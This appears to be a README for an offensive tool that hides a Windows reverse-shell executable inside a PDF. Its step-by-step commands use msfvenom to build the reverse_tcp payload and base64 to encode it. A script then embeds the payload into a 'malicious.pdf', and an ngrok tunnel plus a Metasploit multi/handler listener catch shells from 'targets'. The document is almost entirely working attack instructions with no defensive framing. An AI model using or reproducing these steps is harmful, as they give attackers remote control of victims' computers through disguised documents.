## Creating the Payload

To create the shell executable here:

```
msfvenom -p windows/shell/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

To create the base64 encoded payload, in any command line:

```
base64 shell.exe > payload
```

## Embedding the Payload

To embed the payload in an existing clean.pdf to make a malicious.pdf, simply run:

```
python embed_payload.py
```

When prompted for an input file, enter clean.pdf, and when prompted for output malicious.pdf. By default, the file will look for a payload named payload. 

## Setting up a Listener

To use Ngrok to open up a listener:

```
ngrok tcp <Your Port to Connect On>
```

To be ready to receive TCP connections in Metasploit, first open up msfconsole, and then:

```
use exploit/multi/handler
set PAYLOAD windows/shell/reverse_tcp
set LHOST <Your IP Address>
set LPORT <Your Port to Connect On>
set ExitOnSession false
exploit -j -z
```

## Wait For the Exploit

You'll be able to see when your machine is getting TCP connections to your targets. Each target machine accounts for 2 TCP connections, so in this example, there are 8 connections being made.

![Exploit Demo]()